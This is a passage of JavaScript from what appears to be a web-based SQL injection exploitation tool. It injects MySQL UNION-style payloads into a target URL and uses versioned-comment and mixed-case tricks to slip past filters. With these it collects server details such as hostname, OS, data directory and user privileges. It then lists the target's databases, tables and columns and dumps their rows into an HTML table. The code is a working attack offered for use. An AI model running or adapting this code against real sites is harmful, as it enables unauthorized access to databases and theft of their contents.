                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        FILE SYSTEM: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="FILESYSTEM">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Version: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="version">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Port: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="port">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Data Directory Location: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="dataDir">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Temp Directory Location: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="TempDirectory">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Symlink: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="symlink">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        SSL: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="ssl">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Privilages / intro outfile check: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="privilage">
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>`

        $("body").html(template)
        
        setInterval(function(){
            $("#time").html(moment().format('LL, hh:mm:ss a'))
        },1000)

        $("#output_info").hide()
        $("#menuscontrol").hide()

        getInfo()
        await setDatabase()

        $("#getInfo").on('click', function() {
            $("#output").hide()
            $("#output_info").show()
        })

        $("#getData").on('click', function() {
            $("#output").show()
            $("#output_info").hide()
        })

    }

    async function getInfo() {
        let urlinject = urls

        let UUID = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('UUID/**INDOSEC**/()'))))
        const hostname = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@hostname'))))
        const currentDB = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('database/**INDOSEC**/()'))))
        const user = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('user/**INDOSEC**/()'))))
        const CurrentUser = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('current_user/**INDOSEC**/()'))))
        const os = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@version_compile_os'))))
        const version = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version'))))
        const port = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@port'))))
        const dataDir = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@datadir'))))
        const TempDirectory = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@tmpdir'))))
        const BITSDETAILS = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version_compile_machine'))))
        const FILESYSTEM = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@CHARACTER_SET_FILESYSTEM'))))
        const symlink = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_symlink'))))
        const ssl = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_ssl'))))
        const privilage = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)'))))

        let arr = ['UUID','hostname','currentDB','user','CurrentUser','os','version','port','dataDir','TempDirectory','BITSDETAILS','FILESYSTEM','symlink','ssl','privilage']

        arr.forEach(element => {
            $(`#${element}`).html(eval(element))
        })
    }

    async function setDatabase() {
        let urlinject = urls

        $("#showtable").hide()
        $("#showcolum").hide()
        $("#data").html('')

        urlinject = await replaceText(urlinject, '{::}', PayloadConcat('schema_name'))
        urlinject = await replaceText(urlinject, '+--+-', '+from+/*!50000inforMAtion_schema*/.schemata+--+-')
        databases = await regexs( await request (urlinject) )
        viewDatabase()
    }

    async function viewDatabase() {
        let splitdb = databases.split(",")
        let number = 1
        let thead_col = ["No.", "Databases", "Action"]
        
        $("#output").html(res_thead + res_tbody)
        $("#menuscontrol").hide()

        thead_col.forEach(col => {
            $("#thead_template").append(`
                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    ${col}
                </th>
            `)
        })

        splitdb.forEach(db => {
            $("#tbody_template").append(`
            <tr>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    ${number}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${db}
                </td>
                <td>
                    <div class="flex items-center">
                        <button class="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 rounded border-b-4 border-blue-700 hover:border-blue-500" data-database="${db}">
                            Show Table
                        </button>
                    </div>
                </td>
            </tr>
        `)
            number++
        });

        $("button").on('click', function () {
            setTable($(this).data('database'))
        })
    }

    async function setTable(database) {
        
        let urlinject = urls
        database_select = database

        $("#data").html(database)

        urlinject = await replaceText(urlinject, '{::}', PayloadConcat('table_name'))
        urlinject = await replaceText(urlinject, '+--+-', `+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+${stringtohex(database)}+--+-`)

        tables = await regexs(await request(urlinject))
        viewTable()
    }

    async function viewTable() {
        let splitable = tables.split(",")
        let number = 1
        let thead_col = ["No.", "Tables", "Action"]

        $("#output").html(res_thead + res_tbody)
        $("#menuscontrol").show()

        thead_col.forEach(col => {
            $("#thead_template").append(`
                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    ${col}
                </th>
            `)
        })

        splitable.forEach(table => {
            $("#tbody_template").append(`
                <tr>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        ${number}
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        ${table}
                    </td>
                    <td>
                        <div class="flex items-center">
                            <button class="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 border-b-4 border-blue-700 hover:border-blue-500 rounded" data-table="${table}">
                                Show Data
                            </button>
                        </div>
                    </td>
                </tr>
            `)
            number++
        })

        $("#menuscontrol").html(`
        <li class="inline-flex items-center">
            <a id="backdb" class="cursor-pointer">Home</a>
            <svg
                class="h-5 w-auto text-gray-400"
                fill="currentColor"
                viewBox="0 0 20 20"
            >
                <path
                fill-rule="evenodd"
                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                clip-rule="evenodd"
                ></path>
            </svg>
        </li>
        <li class="inline-flex items-center">
            <a class="text-purple-800">${database_select}</a>
        </li>
        `)

        $("#backdb").on('click', function () {
            viewDatabase()
        })

        $("button").on('click', function () {
            setColumns($(this).data('table'))
        })
    }

    async function setColumns(table) {

        let urlinjection = urls
        table_select = table

        urlinjection = await replaceText(urlinjection, '{::}', PayloadConcat('column_name'))
        urlinjection = await replaceText(urlinjection, '+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table)})+--+-`)

        columns = await regexs(await request(urlinjection))
        viewColumns()
    }

    async function viewColumns() {
        let splitcolumns = columns.split(",")
        $("#output").html(res_thead + res_tbody)
        $("#menuscontrol").show()

        splitcolumns.forEach(col => {
            $("#thead_template").append(`
                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    ${col}
                </th>
            `)
        })

        $("#menuscontrol").html(`
        <li class="inline-flex items-center">
            <a id="backdb" class="cursor-pointer">Home</a>
            <svg
            class="h-5 w-auto text-gray-400"
            fill="currentColor"
            viewBox="0 0 20 20"
            >
            <path
                fill-rule="evenodd"
                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                clip-rule="evenodd"
            ></path>
            </svg>
        </li>
        <li class="inline-flex items-center">
            <a id="backtable" class="cursor-pointer">${database_select}</a>
            <svg
            class="h-5 w-auto text-gray-400"
            fill="currentColor"
            viewBox="0 0 20 20"
            >
            <path
                fill-rule="evenodd"
                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                clip-rule="evenodd"
            ></path>
            </svg>
        </li>
        <li class="inline-flex items-center">
            <a class="text-purple-800">${table_select}</a>
        </li>
        `)

        $("#backtable").on('click', function () {
            viewTable()
        })

        setData(table_select)
    }

    async function setData(table) {
        columns_select = columns.replace(/,/g, `,${stringtohex('{:::}')},`) + ',' + stringtohex('(:::)')

        let urlinjection = urls
        urlinjection = urlinjection.replace('{::}', PayloadConcat(columns_select))
        urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table}+--+-`)

        let res = await request(urlinjection)
        dataTable = await regexs(res.replace(/(\r\n|\n|\r)/gm,""))
        viewData()
    }

    async function viewData() {
        let splitData = dataTable.split("(:::)")

        for (let index = 0; index < splitData.length; index++) {
            $("#tbody_template").append("<tr>")

            let splitDatacol = splitData[index].split("{:::}")

            splitDatacol.forEach(dataCol => {
                    $("#tbody_template").append(`
                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                            ${dataCol.replace(/<(.|\n)*?>/g, '')}
                        </td>
                    `)
            })
            $("#tbody_template").append("</tr>")
        }
    }
    setUrl()
});